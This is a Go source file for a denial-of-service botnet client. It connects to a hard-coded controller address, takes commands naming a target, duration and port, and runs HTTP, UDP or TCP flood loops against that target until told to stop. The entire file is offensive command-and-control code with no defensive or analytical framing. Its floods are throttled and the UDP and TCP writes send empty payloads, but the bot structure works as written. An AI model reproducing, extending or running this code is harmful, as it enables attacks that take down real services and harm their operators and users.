package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"strconv"
	"strings"
	"time"
)

const (
	ControllerIP   = "192.168.1.34"
	ControllerPort = "9080"
)

func main() {
	conn, err := net.Dial("tcp", net.JoinHostPort(ControllerIP, ControllerPort))
	if err != nil {
		fmt.Println("Error connecting to controller:", err)
		return
	}
	defer conn.Close()

	fmt.Println("Connected to controller.")

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		command := strings.TrimSpace(scanner.Text())
		fmt.Println("Received command from controller:", command)

		parts := strings.Fields(command)
		if len(parts) < 4 {
			fmt.Println("Invalid command received:", command)
			continue
		}

		method := parts[0]
		ip := parts[1]
		durationStr := parts[2]
		port := parts[3]

		duration, err := parseDuration(durationStr)
		if err != nil {
			fmt.Println("Invalid duration format:", durationStr)
			continue
		}

		switch method {
		case "HTTP":
			fmt.Printf("Performing HTTP attack on %s for %s\n", ip, duration)
			if err := httpAttack(ip, duration); err != nil {
				fmt.Println("Error performing HTTP attack:", err)
			} else {
				fmt.Println("HTTP attack completed successfully.")
			}
		case "UDP":
			fmt.Printf("Performing UDP attack on %s:%s for %s\n", ip, port, duration)
			if err := udpAttack(ip, port, duration); err != nil {
				fmt.Println("Error performing UDP attack:", err)
			} else {
				fmt.Println("UDP attack completed successfully.")
			}
		case "TCP":
			fmt.Printf("Performing TCP attack on %s:%s for %s\n", ip, port, duration)
			if err := tcpAttack(ip, port, duration); err != nil {
				fmt.Println("Error performing TCP attack:", err)
			} else {
				fmt.Println("TCP attack completed successfully.")
			}
		case "STOP":
			fmt.Println("Received STOP command. Stopping bot.")
			return
		default:
			fmt.Println("Unknown command received:", command)
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading from controller:", err)
	}
}


func parseDuration(durationStr string) (time.Duration, error) {
	durationSeconds, err := strconv.Atoi(durationStr)
	if err != nil {
		return 0, err
	}
	return time.Duration(durationSeconds) * time.Second, nil
}

func httpAttack(targetURL string, duration time.Duration) error {
	client := &http.Client{}
	startTime := time.Now()
	for time.Since(startTime) < duration {
		req, err := http.NewRequest(http.MethodGet, targetURL, nil)
		if err != nil {
			return fmt.Errorf("error creating HTTP request: %v", err)
		}

		resp, err := client.Do(req)
		if err != nil {
			return fmt.Errorf("error sending HTTP request: %v", err)
		}
		resp.Body.Close()

		time.Sleep(50 * time.Millisecond)
	}

	fmt.Println("HTTP attack completed successfully.")
	return nil
}

func udpAttack(ip, port string, duration time.Duration) error {
	udpAddr, err := net.ResolveUDPAddr("udp", net.JoinHostPort(ip, port))
	if err != nil {
		return err
	}

	conn, err := net.DialUDP("udp", nil, udpAddr)
	if err != nil {
		return err
	}
	defer conn.Close()

	fmt.Printf("Performing UDP attack on %s:%s for %s\n", ip, port, duration)
	startTime := time.Now()
	for time.Since(startTime) < duration {
		_, err := conn.Write([]byte(""))
		if err != nil {
			return err
		}
		time.Sleep(50 * time.Millisecond)
	}

	fmt.Println("UDP attack completed successfully.")
	return nil
}


func tcpAttack(ip, port string, duration time.Duration) error {
	if port == "" {
		return fmt.Errorf("port is required for TCP attack")
	}

	tcpAddr, err := net.ResolveTCPAddr("tcp", net.JoinHostPort(ip, port))
	if err != nil {
		return fmt.Errorf("failed to resolve TCP address: %v", err)
	}

	conn, err := net.DialTCP("tcp", nil, tcpAddr)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", tcpAddr.String(), err)
	}
	defer conn.Close()

	fmt.Printf("Performing TCP attack on %s for %s\n", tcpAddr.String(), duration)
	startTime := time.Now()
	for time.Since(startTime) < duration {
		_, err := conn.Write([]byte(""))
		if err != nil {
			return fmt.Errorf("failed to send attack payload: %v", err)
		}
		time.Sleep(50 * time.Millisecond) // Adjust attack packet frequency (e.g., 50 ms)
	}

	fmt.Println("TCP attack completed successfully.")
	return nil
}